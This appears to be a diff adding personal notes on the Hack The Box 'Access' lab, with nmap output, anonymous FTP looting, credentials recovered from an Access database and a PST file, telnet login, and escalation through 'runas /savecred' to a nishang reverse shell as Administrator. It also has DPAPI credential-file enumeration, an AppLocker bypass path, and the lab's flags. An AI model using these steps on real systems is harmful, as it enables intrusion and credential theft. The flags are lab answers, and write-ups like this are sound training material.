@@ -1,0 +1,296 @@
+==
+tags: #windows #easy #roguepotato #printspoofer #umbraco #nfs #cmdkey
+=
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/access.basic 10.129.45.229
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
+23/tcp open  telnet  Microsoft Windows XP telnetd
+| telnet-ntlm-info: 
+|   Target_Name: ACCESS
+|   NetBIOS_Domain_Name: ACCESS
+|   NetBIOS_Computer_Name: ACCESS
+|   DNS_Domain_Name: ACCESS
+|   DNS_Computer_Name: ACCESS
+|_  Product_Version: 6.1.7600
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: MegaCorp
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+  #+end_src
+** full scan
+   #+begin_src bat
+   sudo nmap  -p- -A -T4 -oA nmap/access.full 10.129.45.229
+   #+end_src
+   finds nothing new.
+* ftp
+  anonymous login is allowed;
+  #+begin_src bat
+  ftp> dir
+
+08-23-18  09:16PM       <DIR>          Backups
+08-24-18  10:00PM       <DIR>          Engineer
+
+  ftp> cd Engineer
+  ftp> dir
+
+08-24-18  01:16AM                10870 Access Control.zip
+
+  ftp> binary
+200 Type set to I. 
+
+  ftp> cd Backups
+  ftp> dir
+  ftp> get backup.mdb
+  #+end_src
+  =backup.mdb= is a Microsoft Access DB; and the zip file is encrypted.
+  used a website called [[https://www.mdbopener.com/][mdbopener]] to open the =backup.mdb= file;
+  downloaded the whole db as a collection of csvs; 
+** filter all files in the current directory with line count greater than 1
+   #+begin_src bash
+   $ wc -l * 2>/dev/null | awk '$1 > 1 && $2 != "total" {print $2 " (" $1 " lines)"}' 
+
+acc_timeseg.csv (2 lines)                                 
+acc_wiegandfmt.csv (12 lines)                              
+ACGroup.csv (6 lines)      
+action_log.csv (25 lines)  
+ACUnlockComb.csv (11 lines)                               
+areaadmin.csv (4 lines)                                    
+AttParam.csv (20 lines)                                   
+auth_group.csv (2 lines)                                   
+auth_user.csv (4 lines)                                   
+DEPARTMENTS.csv (6 lines)                                  
+deptadmin.csv (8 lines)   
+LeaveClass1.csv (16 lines)                                
+LeaveClass.csv (4 lines)                                  
+personnel_area.csv (2 lines)                              
+SystemLog.csv (2 lines)                                   
+TBKEY.csv (4 lines)                                       
+USERINFO.csv (6 lines)
+   #+end_src
+   =auth_user= with the following data:
+   #+begin_src 
+  "username": "engineer", "password": "access4u@security"
+   #+end_src
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2026-05-15_15-41.png @ 2026-05-15 15:41:40
+   [[file:ftp/2026-05-15_15-41-40_2026-05-15_15-41.png]]
+** unlock the zip file
+   this is the password to unlock the zip file; the content of which is a =pst= file
+   #+begin_src 
+   $ file access-control.pst
+
+access-control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23),...
+   #+end_src
+   opening this via a website called [[https://goldfynch.com/][goldfinch.com]], we find an email with the contents:
+   #+begin_src
+From: <john@megacorp.com>
+   The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.  Please
+   ensure this is passed on to your engineers.
+To: <security@accesscontrolsystems.com>
+   #+end_src
+** creds
+   #+begin_src 
+   security: 4Cc3ssC0ntr0ller
+   #+end_src
+* telnet
+  #+begin_src bat
+  $ telnet 10.129.45.229 23
+Trying 10.129.45.229...
+Connected to 10.129.45.229.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service 
+
+login: security
+password: 
+
+,*===============================================================
+Microsoft Telnet Server.
+,*===============================================================
+
+C:\Users\security\Desktop>type user.txt
+d0df35cdca5bcf500dc583a597e810c5
+  #+end_src
+* privesc
+** winpeas
+   host the file over smb:
+   #+begin_src bat
+   $ impacket-smbserver share . -smb2support
+   #+end_src
+   and copy it:
+   #+begin_src bat
+C:\Users\security\Desktop>copy \\10.10.17.85\share\winPEASx64.exe C:\Users\security\Desktop\winpeas.exe
+        1 file(s) copied.
+
+C:\Users\security\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8164-DB5F
+
+ Directory of C:\Users\security\Desktop
+
+05/15/2026  11:57 PM    <DIR>          .
+05/15/2026  11:57 PM    <DIR>          ..
+05/15/2026  11:53 PM                 0 output.txt
+05/15/2026  01:17 PM                34 user.txt
+05/15/2026  03:48 PM        10,254,336 winpeas.exe
+               3 File(s)     10,254,370 bytes
+               2 Dir(s)   3,336,404,992 bytes free
+
+C:\Users\security\Desktop> powershell -ExecutionPolicy Bypass -Command  "C:\Users\security\Desktop\winpeas.exe" > C:\Users\security\Desktop\output.txt
+Program 'winpeas.exe' failed to execute: This program is blocked by group policy. For more information, contact your system administrator
+At line:1 char:38
++ C:\Users\security\Desktop\winpeas.exe <<<< .
+At line:1 char:1
++  <<<< C:\Users\security\Desktop\winpeas.exe
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+   #+end_src
+** credential hunting
+   searching for files containing =password= yields several hits one of which is:
+*** skip useless directories with findstr
+   #+begin_src bat
+   C:\>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+
+Program Files\VMware\VMware Tools\open_source_licenses.txt                                                           
+ProgramData\VMware\VMware CAF\pme\data\input\persistence\protocol\amqpBroker_default\uri_amqp.txt
+temp\scripts\README_FIRST.txt  
+   #+end_src
+   #+begin_src bat
+   C:\>type temp\scripts\README_FIRST.txt
+
+Open the SQL Management Studio application located either here:
+   "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"
+Or here:
+   "C:\Program Files\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"
+ 
+- When it opens the "Connect to Server" dialog, under "Server name:" type "LOCALHOST", "Authentication:" selected must be "SQL Server Authentication".
+ 
+   "Login:" = "sa"
+   "Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"
+   ...
+   <SNIP>
+   #+end_src
+   there doesn't seem to be a running instance of SQL Server on the machine;
+   #+begin_src bat
+   C:\temp\scripts>tasklist /FI "IMAGENAME eq sqlservr.exe" 
+
+INFO: No tasks are running which match the specified criteria
+   #+end_src
+   to confirm, =tasklist= was run without filters:
+   #+begin_src 
+   C:\Users\security>tasklist
+                            
+Image Name                 PID      Session Name     Session#    Mem Usage
+=========================  ======== ================ ==========  ===========
+System Idle Process        0        Services           0          24 K
+System                     4        Services           0         304 K
+   #+end_src
+** yawcam
+   there's a directory on the security user's home called =.yawcam= which seems to be some kind
+   of camera softare - stands for =Yet Another Webcam=; let's see if there's some login
+   interface
+** directory fuzzing
+   #+begin_src bat
+   gobuster dir -u 10.129.45.229 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+   #+end_src
+   returns nothing.
+** reverse shell
+   copy the nishang reverse shell script over to the target and execute it:
+   #+begin_src bat
+   c:\Users\security\Desktop>powershell -ExecutionPolicy Bypass -File rev.ps1
+   #+end_src
+* guided mode
+  #+begin_src 
+  What is the name of the executable called by the link file on the Public desktop
+  #+end_src
+  well, never paid attention to this.
+  #+begin_src bat
+  c:\Users\Public\Desktop>dir /Q
+
+ Directory of c:\Users\Public\Desktop
+
+08/22/2018  10:18 PM             1,870 BUILTIN\Administrators ZKAccess3.5 Security System.lnk
+               1 File(s)          1,870 bytes
+               0 Dir(s)   3,349,860,352 bytes free
+  #+end_src
+  as can be seen, the =/Q= option let's us know the owner which is the =Administrators= group
+  let's see what it points to; with just =type=
+  #+begin_src bat
+  c:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
+
+LF@ 7#P/PO :+00/C:\R1M:Windows:M:*wWindowsV1MVSystem32:MV*System32X2P:
+                                                                       runas.exe:1:1*Yrunas.exeL-KEC:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%
+<SNIP>
+  #+end_src
+  so, =runas.exe=; also, from the *official solution*:
+  #+begin_src 
+  A useful command to run when beginning enumeration is  "cmdkey /list"
+  #+end_src
+** next
+   #+begin_src 
+   What Windows command, when given the /list option, will print information about the stored
+   credentials available to the current user
+   #+end_src
+   so the answer is cmdkey; this can be found in [[file:d:/code/htb/academy/modules/windows-privilege-escalation/further-credential-threat.org::*Cmdkey Saved Credentials][this section]]
+** reverse shell
+   let's get a reverse shell as administrator
+   #+begin_src bat
+   runas /savecred /user:ACCESS\Administrator "powershell -ExecutionPolicy Bypass -File c:\users\security\desktop\rev.ps1"
+   #+end_src
+   on our nc listener:
+   #+begin_src bat
+   PS C:\Users\Administrator\desktop> type root.txt
+
+0610c34ee680b0c70b39d2c1e1a0557a
+   #+end_src
+* ippsec
+** ftp - download everything at once
+   #+begin_src bat
+   wget -m --no-passive ftp://anonymous:*password*@10.129.45.229
+   #+end_src
+** http
+   immeditely tries =/robots.txt=; then saves the =jpg= and tries =exiftool=
+   #+begin_src
+   exiftool out.jpg
+   #+end_src
+** unzip with 7z
+   =unzip= fails with =unsupported compression method 99=; so uses 7z instead (we used the gui)
+   #+begin_src bat
+   7z x "Access Control.zip"
+   #+end_src
+** strings - exclude lines less with than some minimum character count
+   #+begin_src 
+   strings -n 8 Backup.mdb | sort -u > word.list
+   #+end_src
+** directly use the wordlist from strings to crack
+   #+begin_src 
+     john access_control.hash --wordlist=word.list
+   #+end_src
+** JAWS enumeration script 
+   runs this and it returns the stored creds
+** use mimikatz to decrypt the stored creds
+   runs into the issue we faced where execution is blocked by group policy, tries to bypass
+   it by placing it in a folder from [[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md][this list]]:
+   #+begin_src 
+   C:\Windows\System32\spool\drivers\color
+   #+end_src
+   but it doesn't work. uses meterpreter instead.
+   in the [[file:htb-Access.pdf][solution pdf]], they identify the credential and master key files, encode to base64
+   and decode it on a machine where mimikatz is installed.
+*** identify the available credential files and masterkeys
+    #+begin_src bat
+    cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS
+    C:\Users\security\AppData\Local\Microsoft\Credentials & dir /S /AS
+    C:\Users\security\AppData\Local\Microsoft\Protect & dir /S /AS
+    C:\Users\security\AppData\Roaming\Microsoft\Vault & dir /S /AS
+    C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS
+    C:\Users\security\AppData\Roaming\Microsoft\Protect"
+    #+end_src
